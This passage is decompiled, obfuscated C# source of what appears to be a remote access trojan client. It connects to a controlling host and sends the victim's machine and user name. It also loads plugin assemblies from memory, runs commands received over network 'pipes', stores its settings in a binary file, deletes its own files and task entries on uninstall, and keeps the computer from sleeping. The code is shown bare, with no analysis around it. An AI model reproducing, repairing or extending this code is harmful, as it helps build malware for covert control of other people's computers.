					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static void smethod_68()
	{
		foreach (GClass2 item in list_2)
		{
			if (item.gclass3_0 != null)
			{
				try
				{
					item.gclass3_0.method_2();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception exception_ = ex;
					smethod_85(item.gclass3_0, exception_, "BuildingHostCache");
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static Assembly smethod_69(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		try
		{
			if (resolveEventArgs_0.Name.StartsWith("ClientPlugin"))
			{
				if ((object)assembly_0 == null)
				{
					assembly_0 = Assembly.Load(byte_1);
				}
				return assembly_0;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "AssemblyResolve");
			ProjectData.ClearProjectError();
		}
		return null;
	}

	private static void smethod_70(Client client_1, string string_4, IPAddress ipaddress_0)
	{
		smethod_87($"Resolved hostname '{string_4}' to '{ipaddress_0}'");
	}

	private static void smethod_71(Client client_1)
	{
		if (list_2 != null)
		{
			foreach (GClass2 item in list_2)
			{
				if (item.gclass3_0 != null)
				{
					try
					{
						item.gclass3_0.method_3(client_1.method_33(), client_1.method_34());
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception exception_ = ex;
						smethod_85(item.gclass3_0, exception_, "HostConnectFailed");
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		smethod_74(bool_6: true);
	}

	private static void smethod_72(Client client_1, Exception exception_0)
	{
		smethod_86(exception_0, string.Empty);
	}

	private static void smethod_73(Client client_1, bool bool_6)
	{
		if (bool_6)
		{
			bool_4 = true;
			dateTime_2 = DateTime.Now.AddMinutes(5.0);
			smethod_87("Connection established.");
			Class11.smethod_6(Class15.guid_0, Environment.MachineName + "\\" + Environment.UserName, Class15.smethod_3(), Class15.smethod_1());
		}
		else
		{
			smethod_74(bool_6: false);
			dateTime_2 = DateTime.MaxValue;
		}
	}

	private static void smethod_74(bool bool_6)
	{
		int_1++;
		if (int_1 == 3)
		{
			int_1 = 0;
			lock (list_3)
			{
				if (int_0 == list_3.Count - 1)
				{
					smethod_63();
				}
				else
				{
					int_0++;
				}
			}
		}
		if (!bool_6)
		{
			smethod_75(bool_6: false);
		}
		if (bool_4)
		{
			bool_4 = false;
			smethod_87("Disconnected from remote host.");
		}
		if (dictionary_2 != null)
		{
			if (dictionary_2.Count != 0)
			{
				smethod_87(string.Format("Closing connection pipes..", dictionary_2.Count));
			}
			Dictionary<string, Client>.Enumerator enumerator = dictionary_2.GetEnumerator();
			while (enumerator.MoveNext())
			{
				enumerator.Current.Value.method_56();
			}
			dictionary_2.Clear();
		}
		ThreadPool.QueueUserWorkItem(delegate
		{
			((Delegate0)delegate
			{
				smethod_43();
			})();
		});
	}

	public static void smethod_75(bool bool_6)
	{
		if (list_2 == null)
		{
			return;
		}
		foreach (GClass2 item in list_2)
		{
			if (item.gclass3_0 != null)
			{
				try
				{
					item.gclass3_0.method_4(bool_6);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception exception_ = ex;
					smethod_85(item.gclass3_0, exception_, "HostStateChanged");
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static void smethod_76(Client client_1, byte[] byte_3)
	{
		GStruct2 gstruct2_ = Class13.smethod_4(byte_3);
		switch (gstruct2_.byte_0)
		{
		case 0:
			Class11.smethod_0(gstruct2_);
			break;
		case 1:
			Class5.smethod_0(gstruct2_);
			break;
		case 2:
			Class10.smethod_0(gstruct2_);
			break;
		}
	}

	public static void smethod_77(Client client_1, byte[] byte_3)
	{
		GStruct2 gstruct2_ = Class13.smethod_4(byte_3);
		GClass3 gclass3_ = client_1.method_30().gclass3_0;
		try
		{
			if (gclass3_ == null)
			{
				smethod_84(client_1.method_30().string_0, gstruct2_);
			}
			else
			{
				gclass3_.method_7(client_1.method_30().string_0, gstruct2_.object_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			string string_ = $"ReadPacket [{client_1.method_30().string_0}]";
			if (gclass3_ == null)
			{
				smethod_86(exception_, string_);
			}
			else
			{
				smethod_85(gclass3_, exception_, string_);
			}
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_78(Client client_1)
	{
		smethod_80(client_1);
	}

	public static void smethod_79(Client client_1, bool bool_6)
	{
		GClass3 gclass3_ = client_1.method_30().gclass3_0;
		if (bool_6)
		{
			smethod_88(client_1, bool_6: true, CommandType.BaseCommand, 2, new object[2]
			{
				client_1.method_30().string_0,
				client_1.method_30().guid_0
			});
			try
			{
				if (gclass3_ == null)
				{
					smethod_82(client_1.method_30().string_0);
				}
				else
				{
					gclass3_.method_5(client_1.method_30().string_0);
				}
				return;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception_ = ex;
				string string_ = $"PipeCreated [{client_1.method_30().string_0}]";
				if (gclass3_ == null)
				{
					smethod_86(exception_, string_);
				}
				else
				{
					smethod_85(gclass3_, exception_, string_);
				}
				ProjectData.ClearProjectError();
				return;
			}
		}
		smethod_80(client_1);
	}

	public static void smethod_80(Client client_1)
	{
		GClass3 gclass3_ = client_1.method_30().gclass3_0;
		try
		{
			if (gclass3_ == null)
			{
				smethod_83(client_1.method_30().string_0);
			}
			else
			{
				gclass3_.method_6(client_1.method_30().string_0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			string string_ = $"PipeDestroyed [{client_1.method_30().string_0}]";
			if (gclass3_ == null)
			{
				smethod_86(exception_, string_);
			}
			else
			{
				smethod_85(gclass3_, exception_, string_);
			}
			ProjectData.ClearProjectError();
		}
		if (client_0.method_35())
		{
			dictionary_2.Remove(client_1.method_30().string_0);
		}
	}

	public static void smethod_81(Client client_1, Exception exception_0)
	{
		smethod_86(exception_0, $"Pipe_ExceptionThrown [{client_1.method_30().string_0}]");
	}

	private static void smethod_82(string string_4)
	{
	}

	private static void smethod_83(string string_4)
	{
	}

	private static void smethod_84(string string_4, GStruct2 gstruct2_0)
	{
		if (Operators.CompareString(string_4, Class18.string_0, false) == 0)
		{
			Class10.smethod_0(gstruct2_0);
		}
	}

	public static void smethod_85(GClass3 gclass3_0, Exception exception_0, string string_4)
	{
		smethod_87(string.Empty);
		smethod_87($"Plugin Exception [{gclass3_0.string_0}] ({string_4}):");
		smethod_87($"{exception_0.Message} {exception_0.StackTrace}");
		smethod_87(string.Empty);
	}

	public static void smethod_86(Exception exception_0, string string_4)
	{
		smethod_87(string.Empty);
		smethod_87($"Client Exception ({string_4}):");
		smethod_87($"{exception_0.Message} {exception_0.StackTrace}");
		smethod_87(string.Empty);
	}

	public static void smethod_87(string string_4)
	{
		if (!bool_3 && !bool_2)
		{
			return;
		}
		string_4 = string_4.Trim();
		if (dateTime_1.Day != DateTime.Now.Day)
		{
			if (bool_3)
			{
				streamWriter_0.WriteLine();
				streamWriter_0.WriteLine(DateTime.Now.ToLongDateString());
				streamWriter_0.WriteLine();
			}
			if (bool_2)
			{
				Console.WriteLine();
				Console.WriteLine(DateTime.Now.ToLongDateString());
				Console.WriteLine();
			}
		}
		string value = $"{DateTime.Now:t}: ";
		if (bool_3)
		{
			streamWriter_0.Write(value);
			streamWriter_0.WriteLine(string_4);
		}
		if (bool_2)
		{
			Console.Write(value);
			Console.WriteLine(string_4);
		}
		dateTime_1 = DateTime.Now;
	}

	public static void smethod_88(Client client_1, bool bool_6, CommandType commandType_0, byte byte_3, object[] object_0)
	{
		Guid guid_ = default(Guid);
		byte[] byte_4 = Class13.smethod_3(bool_6, (byte)commandType_0, byte_3, guid_, object_0);
		client_1.method_54(byte_4);
	}

	public static void smethod_89(Client client_1, bool bool_6, CommandType commandType_0, byte byte_3, Guid guid_0, object[] object_0)
	{
		byte[] byte_4 = Class13.smethod_3(bool_6, (byte)commandType_0, byte_3, guid_0, object_0);
		client_1.method_54(byte_4);
	}

	public static void smethod_90(string string_4, bool bool_6, CommandType commandType_0, byte byte_3, object[] object_0)
	{
		Client client = null;
		if (dictionary_2.ContainsKey(string_4))
		{
			client = dictionary_2[string_4];
			smethod_88(client, bool_6, commandType_0, byte_3, object_0);
		}
	}

	public static void smethod_91()
	{
		foreach (GClass2 item in list_2)
		{
			if (item.gclass3_0 != null)
			{
				try
				{
					item.gclass3_0.method_9();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception exception_ = ex;
					smethod_85(item.gclass3_0, exception_, "ClientUninstalling");
					ProjectData.ClearProjectError();
				}
			}
		}
		bool_3 = false;
		try
		{
			if (streamWriter_0 != null)
			{
				streamWriter_0.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		string[] files = Directory.GetFiles(Class15.string_0, "*", SearchOption.AllDirectories);
		foreach (string path in files)
		{
			try
			{
				File.Delete(path);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Directory.Delete(Class15.string_0, recursive: true);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		smethod_53();
		smethod_55();
		smethod_49(Class15.string_2, 5000);
		smethod_49(Class15.string_2 + " Task", 5000);
	}

	public static void smethod_92()
	{
		try
		{
			bool_1 = false;
			smethod_87("Writing server settings..");
			List<object> list = new List<object>();
			KeyValuePair<string, object>[] entries = gclass6_1.GetEntries();
			for (int i = 0; i < entries.Length; i++)
			{
				KeyValuePair<string, object> keyValuePair = entries[i];
				list.Add(keyValuePair.Key);
				list.Add(RuntimeHelpers.GetObjectValue(keyValuePair.Value));
				smethod_87($"{keyValuePair.Key} = {RuntimeHelpers.GetObjectValue(keyValuePair.Value)}");
			}
			byte[] bytes = Class13.smethod_1(list.ToArray());
			string text = Path.Combine(Class15.string_0, "settings.bin");
			string text2 = Path.Combine(Class15.string_0, "settings.bak");
			if (File.Exists(text))
			{
				File.Delete(text2);
				File.Copy(text, text2);
			}
			File.WriteAllBytes(text, bytes);
			File.Delete(text2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "SaveSettings");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_93(string string_4)
	{
		smethod_87($"Reading client settings from '{string_4}'..");
		try
		{
			gclass6_1.method_0();
			if (!File.Exists(Path.Combine(Class15.string_0, string_4)))
			{
				throw new Exception($"Settings file '{string_4}' could not be found.");
			}
			byte[] array = File.ReadAllBytes(Path.Combine(Class15.string_0, string_4));
			object[] array2 = Class13.smethod_2(array);
			int num = array2.Length - 1;
			for (int i = 0; i <= num; i += 2)
			{
				string arg = (string)array2[i];
				object objectValue = RuntimeHelpers.GetObjectValue(array2[i + 1]);
				gclass6_1.SetValue(arg, RuntimeHelpers.GetObjectValue(objectValue));
				smethod_87($"{arg} = {RuntimeHelpers.GetObjectValue(objectValue)}");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "LoadSettings");
			if (Operators.CompareString(string_4, "settings.bin", false) == 0)
			{
				smethod_93("settings.bak");
			}
			ProjectData.ClearProjectError();
		}
		bool_0 = true;
	}

	private static void smethod_94(object object_0)
	{
		DateTime now = DateTime.Now;
		if (bool_1)
		{
			smethod_92();
		}
		if (client_0 != null && client_0.method_35() && !((now - dateTime_3).TotalMilliseconds < (double)Class15.smethod_20()))
		{
			dateTime_3 = now;
			if ((now - dateTime_2).TotalMilliseconds >= (double)Class15.smethod_21())
			{
				client_0.method_56();
			}
			else
			{
				Class11.smethod_9();
			}
		}
	}

	private static void smethod_95()
	{
		Thread.Sleep(20000);
		uint num = 2147483649u;
		if (Class15.smethod_15())
		{
			num |= 0x40u;
		}
		Class9.SetThreadExecutionState(num);
		smethod_95();
	}
}
